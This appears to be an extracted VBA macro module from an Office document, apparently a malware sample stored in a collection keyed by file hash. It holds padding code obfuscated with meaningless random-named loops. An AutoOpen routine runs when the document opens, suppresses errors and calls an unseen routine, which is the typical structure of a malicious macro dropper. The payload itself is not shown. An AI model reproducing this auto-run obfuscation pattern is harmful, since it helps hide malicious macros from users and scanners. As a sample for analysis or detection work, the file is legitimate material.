@@ -1,0 +1,134 @@
+Filename     : ./macros/b6f2b2fd09ddc60aac8d831089cc795a89ea9fcd327ef0c0e244265e08c0dab4
+OLE stream   : Macros/VBA/j21_30
+VBA filename : j21_30.bas
+----------------------------------------
+Attribute VB_Name = "j21_30"
+Function c81166_(o30396)
+         While G7229771 And O137677
+Select Case w8_162_8
+         Case n64__341
+            B3680669 = Log(c435613)
+            z0_6250 = 980366862
+            T36910 = Int(N3_823 + CLng(U406_19))
+         Case u2943_65
+            H17279 = L8488901
+            d45520 = Cos(153269693)
+            q1463827 = CStr(330858079)
+End Select
+      Wend
+         While B128743 And B_071_50
+Select Case E60910
+         Case d1313459
+            G9184_ = Log(G6461_09)
+            I319678_ = 642431198
+            f2483993 = Int(t62976 + CLng(P26357_2))
+         Case b_5443
+            z902268 = n_1017
+            q359981 = Cos(478042632)
+            W9630337 = CStr(251490308)
+End Select
+      Wend
+Set c81166_ = CVar(o30396)
+         While b8359_1 And k9469816
+Select Case J939291
+         Case l95266
+            f0441981 = Log(G752_062)
+            v18899 = 808506213
+            d910_5 = Int(O2_791 + CLng(j9707758))
+         Case d2863_89
+            F86848 = u8218021
+            n_5532 = Cos(884622483)
+            m0_0_6_ = CStr(781093032)
+End Select
+      Wend
+         While G54560 And l0349_
+Select Case P24017
+         Case f542841_
+            V860278 = Log(N_1716)
+            N77166 = 354024360
+            c66504 = Int(d875183 + CLng(i_60474))
+         Case T04_2221
+            O85833 = o03059_0
+            M3_242 = Cos(938899852)
+            i763_8 = CStr(59754062)
+End Select
+      Wend
+         While o0492618 And a4_218
+Select Case z69525
+         Case I861905
+            j892_4 = Log(I2_4097_)
+            Z_580274 = 375098906
+            V8021514 = Int(K65138 + CLng(s_16__))
+         Case z9877_2
+            a2395683 = a18765
+            M8_8_45 = Cos(394165218)
+            Y644239 = CStr(594074891)
+End Select
+      Wend
+End Function
+Sub _
+autoopen()
+On Error Resume Next
+         While r6_73526 And P429_88
+Select Case a17584
+         Case F_73156_
+            W833845 = Log(W887_5)
+            s41347 = 666925634
+            h530895 = Int(N_4431 + CLng(G15470))
+         Case f86522
+            H8_139 = d821_71
+            F6873173 = Cos(739516046)
+            t82251 = CStr(162195872)
+End Select
+      Wend
+         While r98693 And U9448252
+Select Case Q16756_
+         Case A055252
+            n75416 = Log(w35410)
+            K68342 = 615491629
+            c1143065 = Int(P2__103 + CLng(M1__240))
+         Case Y_7_366
+            o840__6_ = a8417_
+            j2_14___ = Cos(211022618)
+            u56636 = CStr(859381382)
+End Select
+      Wend
+Call P255599
+         While c4646973 And S9964348
+Select Case u803799
+         Case o52490
+            d6_29_7 = Log(A7371070)
+            V4881110 = 278893779
+            B7_7933 = Int(i38992 + CLng(o7658__))
+         Case o0282434
+            P_3855_3 = z009628
+            Q7_4_5 = Cos(320796484)
+            b05593_ = CStr(647744433)
+End Select
+      Wend
+         While T4410_6 And Y41934
+Select Case Z__960
+         Case A4_5180
+            i40927 = Log(h_126827)
+            q78060 = 741949164
+            b3_9509 = Int(K4454100 + CLng(c790_6))
+         Case T80114_
+            j384823 = t5371767
+            m41444 = Cos(394840214)
+            I31536 = CStr(150522948)
+End Select
+      Wend
+         While Y2306505 And O25023
+Select Case J8093584
+         Case U_7038
+            U942025 = Log(m_8656)
+            t280022 = 918741632
+            o55_89 = Int(t7198464 + CLng(q7_6145))
+         Case i683332
+            h030_7 = a16556
+            F1145171 = Cos(443850847)
+            K49768 = CStr(193211706)
+End Select
+      Wend
+End Sub
+
